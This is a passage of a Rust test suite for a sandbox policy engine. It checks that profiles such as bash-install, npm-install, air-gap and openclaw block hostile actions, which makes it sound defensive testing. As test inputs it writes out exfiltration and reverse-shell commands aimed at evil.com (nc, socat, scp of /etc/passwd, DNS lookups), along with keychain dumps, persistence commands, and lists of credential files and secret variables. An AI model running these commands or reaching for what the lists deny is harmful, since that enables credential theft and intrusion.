        let d = engine.evaluate_execution("git push origin main");
        assert_eq!(d.action, PolicyAction::Deny);

        // git clone should be allowed
        let d = engine.evaluate_execution("git clone https://github.com/example/repo.git");
        assert_eq!(d.action, PolicyAction::Allow);

        // git pull should be allowed
        let d = engine.evaluate_execution("git pull origin main");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_protocols_restricted() {
        let engine = comfyui_engine();

        assert_eq!(engine.evaluate_protocol("https").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        // Raw TCP/UDP denied
        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_credential_functions_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "getpass.getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.get_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.set_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_dangerous_commands_blocked() {
        let engine = comfyui_engine();

        // curl and wget blocked
        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        // Shell spawning blocked
        let d = engine.evaluate_execution("sh");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_git_remote_manipulation_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git remote add exfil https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git remote set-url origin https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_model_downloads_allowed() {
        let engine = comfyui_engine();

        // HuggingFace allowed
        let d = engine.evaluate_http_url(
            "https://huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
            "huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        // CivitAI allowed
        let d = engine.evaluate_http_url(
            "https://civitai.com/api/download/models/12345",
            "civitai.com/api/download/models/12345",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        // Localhost allowed (ComfyUI web UI)
        let d = engine.evaluate_http_url(
            "http://127.0.0.1:8188/api/queue",
            "127.0.0.1:8188/api/queue",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_suspicious_domains_warned() {
        let engine = comfyui_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_comfyui_sensitive_files_denied() {
        let engine = comfyui_engine();

        // SSH keys denied
        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // AWS credentials denied
        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // PEM files denied
        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Private keys denied
        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // GH CLI tokens denied
        let d = engine.evaluate_file("~/.config/gh/hosts.yml", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal files allowed (only deny rules, implicit allow)
        let d = engine.evaluate_file("/tmp/model.safetensors", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_sensitive_envvars_denied() {
        let engine = comfyui_engine();

        // Secret patterns denied
        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("API_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DB_PASSWORD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("STRIPE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        // Cloud/service prefixes denied
        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvars allowed (only deny rules, implicit allow)
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // bash-install detection tests
    // =====================================================================

    #[test]
    fn test_detect_bash_install_bare_bash_is_interactive() {
        // Bare `bash` is an interactive REPL — should NOT match bash-install.
        // (When stdin is a TTY, as in tests, bare bash is interactive.)
        assert_eq!(detect_policy(&strs(&["bash"])), None);
    }

    #[test]
    fn test_detect_bash_install_bare_sh_is_interactive() {
        assert_eq!(detect_policy(&strs(&["sh"])), None);
    }

    #[test]
    fn test_detect_bash_install_with_script() {
        assert_eq!(
            detect_policy(&strs(&["bash", "install.sh"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_install_with_c_flag() {
        assert_eq!(
            detect_policy(&strs(&["bash", "-c", "echo test"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_install_with_flags_and_script() {
        assert_eq!(
            detect_policy(&strs(&["bash", "--norc", "install.sh"])),
            Some("bash-install"),
        );
    }

    #[test]
    fn test_detect_bash_interactive_flag_only() {
        // `bash -i` is explicitly interactive — should NOT match.
        assert_eq!(detect_policy(&strs(&["bash", "-i"])), None);
    }

    // =====================================================================
    // bash-install auto-policy: attack scenario tests
    // =====================================================================

    fn bash_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("bash-install").expect("bash-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("bash-install policy must parse")
    }

    #[test]
    fn test_bash_install_policy_parses() {
        let engine = bash_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_bash_install_allows_curl_wget() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("curl -fsSL https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("wget -O- https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_build_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("make install");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cargo build --release");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("gcc -o tool tool.c");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_package_managers() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("apt-get install -y libssl-dev");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("brew install openssl");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("pip install setuptools");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_interpreters() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("python3 -c 'import os; os.system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ruby -e 'system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_persistence() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("at now + 30 minutes");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("launchctl load ~/Library/LaunchAgents/com.evil.plist");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_reviews_privilege_escalation() {
        let engine = bash_install_engine();

        // sudo/su/doas are in review mode — denied but user can approve interactively
        let d = engine.evaluate_execution("sudo bash -c 'echo evil >> /etc/crontab'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);

        let d = engine.evaluate_execution("su root");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_bash_install_blocks_obfuscation_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("base64 -d /tmp/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xxd -r -p /tmp/hex");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("rev /tmp/reversed");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dns_exfiltration() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_raw_net_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_clipboard() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("pbcopy");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xclip -selection clipboard");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_on_eval() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("eval echo test");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_credential_files() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shell_profile_writes() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.bashrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.zshrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.profile", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_git_hooks() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file(".git/hooks/pre-commit", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/project/.git/hooks/post-checkout", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_cloud_metadata() {
        let engine = bash_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_anonymity_domains() {
        let engine = bash_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_env_secrets() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvar allowed
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_anti_tracing_envvars() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_native_getpass_crypt() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_remote_access() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp /etc/passwd user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_keychain() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("security find-generic-password -s github.com -w");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shared_memory() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("/dev/shm/exfil", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // npm-install: base coverage tests
    // =====================================================================

    fn npm_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("npm-install").expect("npm-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("npm-install policy must parse")
    }

    #[test]
    fn test_npm_install_policy_parses() {
        let engine = npm_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_npm_install_blocks_credential_files() {
        let engine = npm_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_env_secrets() {
        let engine = npm_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_npm_install_blocks_native_getpass() {
        let engine = npm_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_cloud_metadata() {
        let engine = npm_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_warns_anonymity_domains() {
        let engine = npm_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // pip-install: base coverage tests
    // =====================================================================

    fn pip_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("pip-install").expect("pip-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("pip-install policy must parse")
    }

    #[test]
    fn test_pip_install_policy_parses() {
        let engine = pip_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_pip_install_blocks_credential_files() {
        let engine = pip_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_env_secrets() {
        let engine = pip_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pip_install_blocks_native_getpass() {
        let engine = pip_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_cloud_metadata() {
        let engine = pip_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_warns_anonymity_domains() {
        let engine = pip_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // comfyui: additional base coverage tests
    // =====================================================================

    #[test]
    fn test_comfyui_blocks_cloud_metadata() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_kube_config() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_native_getpass_crypt() {
        let engine = comfyui_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_anti_tracing_envvars() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // base policy: parse test
    // =====================================================================

    #[test]
    fn test_base_policy_parses() {
        let yaml = embedded_policy("base").expect("base policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("base policy must parse");
    }

    // =====================================================================
    // air-gap policy tests
    // =====================================================================

    fn air_gap_engine() -> PolicyEngine {
        let yaml = embedded_policy("air-gap").expect("air-gap policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("air-gap policy must parse")
    }

    #[test]
    fn test_air_gap_policy_parses() {
        let engine = air_gap_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_air_gap_blocks_all_domains() {
        let engine = air_gap_engine();

        let d = engine.evaluate_domain("evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("localhost");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("169.254.169.254");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("internal.corp.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_urls() {
        let engine = air_gap_engine();

        let d = engine.evaluate_http_url(
            "https://evil.com/exfil",
            "evil.com/exfil",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_endpoints() {
        let engine = air_gap_engine();

        let d = engine.evaluate_endpoint("evil.com", 443);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("127.0.0.1", 8080);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("localhost", 22);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_network_commands() {
        let engine = air_gap_engine();

        // HTTP tools
        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        // Remote access
        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp file user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);

        // Raw networking
        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);

        // DNS tools
        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        // Privilege escalation
        let d = engine.evaluate_execution("sudo iptables -F");
        assert_eq!(d.action, PolicyAction::Deny);

        // Network configuration
        let d = engine.evaluate_execution("ip addr show");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ifconfig eth0");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_allows_non_network_commands() {
        let engine = air_gap_engine();

        // Commands not in the deny list should be allowed (implicit allow)
        let d = engine.evaluate_execution("ls -la");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cat /etc/hostname");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("echo hello");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_files_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_base_envvars_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvar allowed
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_symbols_present() {
        let engine = air_gap_engine();

        // Credential interception (inlined from base)
        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        // Networking symbols — the core of the air-gap
        let d = engine.evaluate_native_function("socket", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("connect", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("sendto", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("getaddrinfo", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("bind", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_syscalls_section_present() {
        let engine = air_gap_engine();

        // The air-gap policy should enable Stalker via syscalls section
        assert!(engine.has_syscalls_section(), "air-gap policy must have syscalls section");

        // Network syscalls denied
        let d = engine.evaluate_syscall("socket");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_syscall("connect");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_syscall("sendto");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_syscall("recvfrom");
        assert_eq!(d.action, PolicyAction::Deny);

        // Process creation syscalls denied
        let d = engine.evaluate_syscall("execve");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_syscall("fork");
        assert_eq!(d.action, PolicyAction::Deny);

        // File access syscalls denied
        let d = engine.evaluate_syscall("open");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_syscall("openat");
        assert_eq!(d.action, PolicyAction::Deny);

        // Non-sensitive syscall should be allowed (implicit allow)
        let d = engine.evaluate_syscall("read");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // openclaw detection tests
    // =====================================================================

    #[test]
    fn test_detect_openclaw_direct_binary() {
        assert_eq!(
            detect_policy(&strs(&["openclaw", "gateway"])),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_mjs() {
        assert_eq!(
            detect_policy(&strs(&["openclaw.mjs", "doctor"])),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_node_with_path() {
        assert_eq!(
            detect_policy(&[
                String::from("node"),
                String::from("/usr/local/lib/node_modules/openclaw/dist/openclaw.mjs"),
            ]),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_npm_install_priority() {
        // `npm install openclaw` should match npm-install (not openclaw).
        assert_eq!(
            detect_policy(&strs(&["npm", "install", "openclaw"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_openclaw_no_false_positive() {
        // `node server.js` should NOT match openclaw.
        assert_eq!(
            detect_policy(&strs(&["node", "server.js"])),
            None,
        );
    }

    // =====================================================================
    // openclaw auto-policy: attack scenario tests
    // =====================================================================

    fn openclaw_engine() -> PolicyEngine {
        let yaml = embedded_policy("openclaw").expect("openclaw policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("openclaw policy must parse")
    }

    #[test]
    fn test_openclaw_policy_parses() {
        let engine = openclaw_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_openclaw_nodejs_eval_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "eval", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Node, "vm.runInContext", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "vm.compileFunction", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.exec", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.execSync", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_nodejs_networking_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "net.connect", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "net.createServer", &[]);
